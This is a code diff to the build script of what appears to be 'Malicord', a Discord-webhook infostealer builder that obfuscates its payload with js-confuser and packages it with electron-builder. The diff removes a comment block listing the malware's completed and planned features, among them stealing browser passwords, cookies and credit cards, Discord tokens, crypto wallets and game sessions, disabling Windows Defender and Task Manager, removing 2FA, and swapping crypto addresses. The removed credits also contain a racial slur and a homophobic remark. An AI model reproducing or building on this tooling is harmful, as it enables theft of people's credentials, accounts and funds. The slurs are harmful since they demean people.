@@ -6,113 +6,6 @@ const { build, Platform, Arch } = require("electron-builder");
 const sourceDirectory = "./script";
 const jsConfuser = require("js-confuser");
 
-/*
-                @credits:
-                - Developers: FalseKSCH | Shiris les plus beaux des negres
-                - Bro CPP (btw gay): Mcraxker
-                - Friend: Irax | NolayDsc | M4t
-
-                 @Todo List:
-                - second run remove fake error execute in silent
-                - fix filter.js
-                - get potential passwords discord
-                - customize size
-                - don't appear in task manager
-                - anti launch spam
-
-                - add reddit/insta/tiktok (un jour inshallah)
-                - Force Disabler 2fa (un jour inshallah)
-                - Cheat Auth Stealer (un jour inshallah)
-                - custom author & desc (un jour inshallah)
-
-                @latest:
-                - fix removesub [BOT ADMIN] ✅
-                - fix unicode module error ✅
-                - /help [BOT] ✅
-                - /features [BOT] ✅
-                - key license system (/claim) ✅
-                - binder ✅
-
-                @OK:
-                - Steal Windows Wifi Passwords ✅
-                - Steal Windows Clipboard ✅
-                - webpack ✅
-                - New obfuscation ✅
-                - enable admin if taskmngr and defender killed ✅
-                - patch injection ✅
-                - upload sur transfer si pb gofile ✅
-                - chrome injection steal cookies/history/keylogger ✅
-                - Fix exodus injection ✅
-                - steal in other lecteur usb/reseau ✅
-                - /remove abonnement ✅
-                - ask admin with "CMD.exe" name + verified editor ✅
-                - get antivirus installed ✅
-                - Bot Add option "disable settings (task manager & defender)" ✅
-                - disable task manager ✅
-                - Disable defender ✅
-                - Bot option "Chrome injection" ✅
-                - Fix "startup" ✅
-                - if chrome inject = true alors ask admin => task manager disabler => cached files ✅
-                - Chrome Extensions Injector ✅
-                - fix minecraft session ✅
-                - fix twitter location ✅
-                - fix canary/PTB injection bugged ✅
-                - Ubisoft Play stealer (Uplay) ✅
-                - config saver (/config create, config load, config modify) ✅
-                - steal mozilla: cookies, history, downloads, autofills, passwords, credits cards ✅ 
-                - le /getrole customer ✅
-                - send config when build ✅
-                - if keywords.zip is empty remove don't upload ✅
-                - emoji injection ✅
-                - inject ptb x canary x other clients ✅
-                - roblox.txt ✅
-                - partner emoji discord.js ✅
-                - Embeds rewrited ✅
-                - Fix "Clients" in "Games" Space ✅
-                - force change mail ✅
-                - injection change email +1 (check if used) +2 ✅
-                - add to bot settings "auto remove 2fa" ✅
-                - Auto Mail Changer ✅
-                - Disable Email notification ✅
-                - auto remove 2fa ✅
-                - get backups codes ✅
-                - Auto Mail Changer ✅
-                - Disable Email notification ✅
-                - Auto remove 2fa ✅
-                - Get backups codes ✅
-                - Nitro Badges Boost in First Embed ✅
-                - Fix Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable) ✅
-                - Detail steam login ✅
-                - Modifier tout les embeds (couleur / roblox / minecraft) ✅
-                - Exodus injection (https://github.com/ld0l/Eject/) ✅
-                - Parse All Bots / Guilds owner|admin / UHQ Friends ✅
-                - Add Fake Error ✅
-                - Créer un fichier ThiefCat pour l'injection car ça permet d'init l'inject ✅
-                - Roblox Session ✅
-                - NordVPN / OpenVPN (using glob) ✅
-                - NationGlory login ✅
-                - Ubisoft ✅
-                - Steal RiotGame ✅
-                - Take a Screenshot ✅
-                - Add to startup ✅
-                - Debug Killer (Kill task gestionary/CMD) ✅
-                - Anti Debug / Anti Firewall ✅
-                - Modify System Informations ✅
-                - Ajouter systeme de config ✅
-                - steam | battlenet | EpicGame Session ✅
-                - Crypto Adress Swaper ✅
-                - Discord Token Grabber (for discord app) ✅
-                - Bypass TokenProtector | BetterDiscord ✅
-                - Fix injecteur  ✅
-                - Fix Extension wallets stealer ✅
-                - Steal Wallets App: Zcash, Armory, ByteCoin, Ethereum, Jaxx, Atomic Wallet, Guarda, Coinomi ✅
-                - Add Minecraft Session ✅
-                - Modifier le nom des fichiers ils sont trop laid ✅
-                - Steal Epicgame ✅
-                - Steal Growtopia ✅
-
-*/
-
 async function obfufirst(config) {
   const webhook = config.webhook,
     author = config.author ?? "KSCH-58",
@@ -157,7 +50,7 @@ async function obfufirst(config) {
     const tosend = {
       username: "Malicord",
       avatar_url:
-        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/novalogo3.png",
+        "https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord.png",
       embeds: [
         {
           color: 10038562,
@@ -496,7 +389,7 @@ async function building(dest, config) {
         console.log('Files: ' + name);
       }
     });
-  } catch (err) {}
+  } catch (err) {console.log(err)}
 }
 
 async function main(config) {
